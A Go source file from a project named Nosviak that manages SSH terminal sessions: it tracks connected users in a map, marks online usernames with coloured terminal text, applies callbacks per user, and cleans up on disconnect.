package sessions

import (
	"Nosviak/core/database"
	"Nosviak/core/masters/users/terminal"
	"errors"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)


//checks if the user is active correctly
//this allows us to detect if a user is active or not
func (s *Session) UserOnline(usr string, grad bool) string {

	

	//ranges through all active sessions
	//we will compare the usernames on every rotation
	for _, session := range Sessions {

		//compares the to query users to check if the user is active
		if session.User.Username == usr {
			//returns true as the user is safely active
			if grad {
				//returns the gradient edition of the information
				return "+\x1b[38;5;45m🌐\x1b[38;5;15m "+usr+"+"
			} else {
				//returns the default edition of the information
				return "\x1b[38;5;45m🌐\x1b[38;5;15m "+usr+"\x1b[0m"
			}
		}
	}

	//returns the information without the active information
	return usr
}

//this will execute this command for every session open with that username
//this allows us to control more information about a username
func ControlSession(user string, execute func(s *Session) (*Session, error)) error {

	//ranges through all sessions
	//we will further filter this using strings.EqualFold
	for _, session := range Sessions {

		//checks if the sessions are the same correctly
		//this will make sure we won't execute for every session alive
		if strings.EqualFold(strings.ToLower(session.User.Username), strings.ToLower(user)) {

			//executes the function set in the overhead
			//this allows us to control more information about the session
			if s, err := execute(session); err != nil {
				//handles the error correctly
				return err
			} else {
				//correctly saves the changes into the map position
				session = s
			}
		}
	}
	//returns nil if no errors happened during execution
	return nil
}

//trys to insert the object into the map
//if an error occurs we will print the error
func (s *Session) NewSession() error {

	s.Title = "title.dtx"

	//checks if the object is already inside a map
	if _, ok := Sessions[s.Connected.Unix()]; ok {
		return errors.New("session has already been placed inside the map")
	}

	mux.Lock()
	defer mux.Unlock()
	//inserts the object into the map correctly
	Sessions[s.Connected.Unix()] = s

	go s.AwaitDisconnect()

	return nil
}

//waits for the session to disconnect
func (s *Session) AwaitDisconnect() {

	//waits for the session to be closed
	s.Conn.Wait()

	//removes the instance from the map
	delete(Sessions, s.Connected.Unix())
}

//creates a new session structure correctly
func MakeSession(user *database.User, channel ssh.Channel, conn *ssh.ServerConn, opened time.Time) *Session {
	return &Session{
		User: user,
		Channel: channel,
		Conn: conn,
		Connected: opened,
		Idle: time.Now(),
		TerminalSize: &TerminalSize{
			W: 80, H: 24,
		},
		Terminal: terminal.NewTerm(channel),
	}
}